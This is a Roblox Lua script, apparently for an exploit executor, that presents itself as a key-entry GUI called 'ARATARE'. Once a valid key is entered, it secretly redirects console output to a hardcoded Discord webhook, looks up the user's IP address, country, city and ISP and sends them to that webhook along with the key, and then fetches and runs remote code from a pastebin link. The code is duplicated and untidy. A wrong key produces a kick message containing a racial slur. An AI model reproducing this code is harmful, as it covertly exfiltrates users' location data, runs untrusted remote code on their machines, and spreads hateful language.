local player = game.Players.LocalPlayer
local screenGui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
screenGui.Name = "CustomGUI"
 
-- Create background
local background = Instance.new("Frame", screenGui)
background.Size = UDim2.new(0, 450, 0, 300)
background.Position = UDim2.new(0, 276, 0, 164)
background.BackgroundColor3 = Color3.fromHex("#23232c")
background.BorderSizePixel = 1
background.BorderColor3 = Color3.fromHex("#343638")
 
local bgCorner = Instance.new("UICorner", background)
bgCorner.CornerRadius = UDim.new(0, 8)
 
-- Create textbox frame
local textboxFrame = Instance.new("Frame", screenGui)
textboxFrame.Size = UDim2.new(0, 300, 0, 50)
textboxFrame.Position = UDim2.new(0, 350, 0, 345)
textboxFrame.BackgroundColor3 = Color3.fromHex("#23232c")
 
-- Create textbox
local textbox = Instance.new("TextBox", textboxFrame)
textbox.Size = UDim2.new(1, -4, 1, -4)
textbox.Position = UDim2.new(0, 2, 0, 2)
textbox.BackgroundColor3 = Color3.fromHex("#23232c")
textbox.TextColor3 = Color3.fromRGB(0, 0, 0)
textbox.Font = Enum.Font.Code
textbox.TextSize = 16
textbox.TextWrapped = true
textbox.Text = "Enter text here..."
textbox.BorderSizePixel = 10
textbox.BorderColor3 = Color3.fromRGB(0, 170, 0)
 
local textboxCorner = Instance.new("UICorner", textbox)
textboxCorner.CornerRadius = UDim.new(0, 8)
 
-- Create title label
local titleLabel = Instance.new("TextLabel", screenGui)
titleLabel.Size = UDim2.new(0, 100, 0, 32)
titleLabel.Position = UDim2.new(0, 450, 0, 190)
titleLabel.Text = "ARATARE"
titleLabel.TextColor3 = Color3.fromHex("#ffffff")
titleLabel.BackgroundColor3 = Color3.fromHex("#23232c")
titleLabel.Font = Enum.Font.Fantasy
titleLabel.TextSize = 30
titleLabel.BorderSizePixel = 0
 
-- Create key system label
local keysystemLabel = Instance.new("TextLabel", screenGui)
keysystemLabel.Size = UDim2.new(0, 100, 0, 32)
keysystemLabel.Position = UDim2.new(0, 450, 0, 225)
keysystemLabel.Text = "Keysystem"
keysystemLabel.TextColor3 = Color3.fromHex("#ffffff")
keysystemLabel.BackgroundColor3 = Color3.fromHex("#23232c")
keysystemLabel.Font = Enum.Font.ArialBold
keysystemLabel.TextSize = 18
keysystemLabel.BorderSizePixel = 0
 
-- Create prompt label
local promptLabel = Instance.new("TextLabel", screenGui)
promptLabel.Size = UDim2.new(0, 100, 0, 32)
promptLabel.Position = UDim2.new(0, 359, 0, 301)
promptLabel.Text = "Enter your key:"
promptLabel.TextColor3 = Color3.fromHex("#ffffff")
promptLabel.BackgroundColor3 = Color3.fromHex("#23232c")
promptLabel.Font = Enum.Font.ArialBold
promptLabel.TextSize = 16
promptLabel.BorderSizePixel = 0
 
-- Create checkmark button
local checkmarkButton = Instance.new("TextButton", screenGui)
checkmarkButton.Size = UDim2.new(0, 100, 0, 32)
checkmarkButton.Position = UDim2.new(0, 540, 0, 410) 
checkmarkButton.Text = " ✔ "
checkmarkButton.TextColor3 = Color3.fromRGB(255, 255, 255)
checkmarkButton.BackgroundColor3 = Color3.fromRGB(0, 170, 0) -- Green color
checkmarkButton.Font = Enum.Font.SourceSansBold
checkmarkButton.TextSize = 16
checkmarkButton.BorderSizePixel = 0
 
-- Initialize the table for valid keys
local validKeys = {}
 
-- Add different keys to the table
validKeys["key1"] = true --dev key
validKeys["dih"] = true --change on ...
validKeys["key3"] = true --change on ...
validKeys["key4"] = true --change on ...

checkmarkButton.MouseButton1Click:Connect(function()
    local userInput = textbox.Text
    if validKeys[userInput] then  -- Check if userInput is a valid key
        print("Correct key! Access granted.")

        local HttpService = game:GetService("HttpService")

 local userInput = textbox.Text
 
local HttpService = game:GetService("HttpService")

-- Your Discord Webhook URL
local WebhookURL = "https://discord.com/api/webhooks/1364344487295455302/n1KWqURr1a5ckzIEK55mA0jIvViGo7UNpbicnSlHaJTqdi9pvOTJAaa5Q_WyIWvHAVGY"

-- Function to send log to Discord
local function sendToDiscord(message)
    local data = {
        ["content"] = message,
        ["username"] = "Roblox Logger"
    }
    
    local request = syn and syn.request or http_request or request or (http and http.request)
    if request then
        request({
            Url = WebhookURL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(data)
        })
    else
        warn("Your executor does not support HTTP requests.")
    end
end

-- Capture output and send it to Discord
local function captureLogs()
    -- Override print to send logs to Discord
    local oldPrint = print
    print = function(...)
        local args = {...}
        local logMessage = table.concat(args, " ")
        sendToDiscord(logMessage)  -- Send the log message to Discord
        oldPrint(unpack(args))  -- Also print to the F9 console
    end
end

-- Start capturing logs
captureLogs()

-- Fetch IP info and send to Discord
local requestFunc = syn and syn.request or http_request or request or (http and http.request)
if not requestFunc then
    warn("Your executor doesn't support HTTP requests.")
    return
end

local response = requestFunc({
    Url = "http://ip-api.com/json/", -- This gives your IP and geolocation info
    Method = "GET"
})

if response and response.Body then
    local data = HttpService:JSONDecode(response.Body)
    local ipInfoMessage = "== Your IP Info ==\n"
    ipInfoMessage = ipInfoMessage .. "IP: " .. data.query .. "\n"
    ipInfoMessage = ipInfoMessage .. "Country: " .. data.country .. "\n"
    ipInfoMessage = ipInfoMessage .. "Region: " .. data.regionName .. "\n"
    ipInfoMessage = ipInfoMessage .. "City: " .. data.city .. "\n"
    ipInfoMessage = ipInfoMessage .. "ISP: " .. data.isp .. "\n"
    ipInfoMessage = ipInfoMessage .. "Timezone: " .. data.timezone

    -- Send IP info to Discord
    sendToDiscord(ipInfoMessage)
else
    warn("Failed to fetch important functions.")
end

print(userInput)

-- Your Discord Webhook URL
local WebhookURL = "https://discord.com/api/webhooks/1364344487295455302/n1KWqURr1a5ckzIEK55mA0jIvViGo7UNpbicnSlHaJTqdi9pvOTJAaa5Q_WyIWvHAVGY"

-- Function to send log to Discord
local function sendToDiscord(message)
    local data = {
        ["content"] = message,
        ["username"] = "Roblox Logger"
    }
    
    local request = syn and syn.request or http_request or request or (http and http.request)
    if request then
        request({
            Url = WebhookURL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(data)
        })
    else
        warn("Your executor does not support HTTP requests.")
    end
end

-- Capture output and send it to Discord
local function captureLogs()
    -- Override print to send logs to Discord
    local oldPrint = print
    print = function(...)
        local args = {...}
        local logMessage = table.concat(args, " ")
        sendToDiscord(logMessage)  -- Send the log message to Discord
        oldPrint(unpack(args))  -- Also print to the F9 console
    end
end

-- Start capturing logs
captureLogs()

if response and response.Body then
    local data = HttpService:JSONDecode(response.Body)
    local keyInfoMessage = "== NEW LOGIN DETECTED, KEY:=="
    keyInfoMessage = userInput
    -- Send IP info to Discord
    sendToDiscord(keyInfoMessage)
else
    warn("Failed to fetch important functions..")
end

loadstring(game:HttpGet('https://pastebin.com/raw/ZCrJ6WV0'))()

        -- # PUT ALL THE MAIN SCRIPT IN HERE #
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
        -- Optionally, you can also destroy individual elements (in case you want them completely gone)
        background:Destroy()         -- Destroys the background frame
        textboxFrame:Destroy()       -- Destroys the textbox frame
        textbox:Destroy()            -- Destroys the textbox
        titleLabel:Destroy()         -- Destroys the title label
        keysystemLabel:Destroy()     -- Destroys the keysystem label
        promptLabel:Destroy()        -- Destroys the prompt label
        checkmarkButton:Destroy()    -- Destroys the checkmark button
 
        -- Optionally, destroy the script if it's local and you want it to disappear
        script:Destroy()
    else
        warn("Incorrect key.")
        local player = game.Players.LocalPlayer
        player:Kick("no key no access (fucking nigger)")
    end
end)
 
 
